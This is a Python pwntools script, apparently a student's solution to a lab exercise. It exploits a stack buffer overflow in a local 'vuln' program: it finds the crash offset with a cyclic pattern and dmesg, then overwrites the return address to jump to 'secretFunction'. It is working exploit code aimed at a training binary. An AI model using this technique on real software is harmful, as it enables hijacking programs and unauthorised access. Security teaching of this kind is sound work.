from pwn import *
pwnlib.term.term_mode= False

# =============================================
# ========= write your code below  ============
# =============================================

def run(path_to_vuln_prgm):
    # payload = b'a'*27
    # this is a special way to print bytes string with non utf-8 characters 
    # sys.stdout.buffer.write(p.recvall())
    e = ELF(path_to_vuln_prgm)
    p = process(path_to_vuln_prgm)
    payload = cyclic(512) # b'a'*32 + 
    p.sendline(payload)
    p.wait_for_close()
    debug_info = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE, shell=True).recvall()
    eip =  int(re.search(b'at\ (.*)\ ip', debug_info).group(1), 16)
    x = cyclic_find(p32(eip))
    payload = payload[:x] + p32(e.symbols['secretFunction'])
    p = process(path_to_vuln_prgm)
    p.sendline(payload)
    print(p.recvall())

# =============================================
# ===== do not modify the code below ==========
# =============================================
    
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print('Usage:    ' + os.path.basename(__file__) + ' path_to_vuln_prgm')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   path_to_vuln_prgm = args[0] if len(args) > 0 else None
   for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
   # check arguments
   if (path_to_vuln_prgm is None):
       print('path_to_vuln_prgm is missing\n')
       usage()
   # run the command
   run(path_to_vuln_prgm)
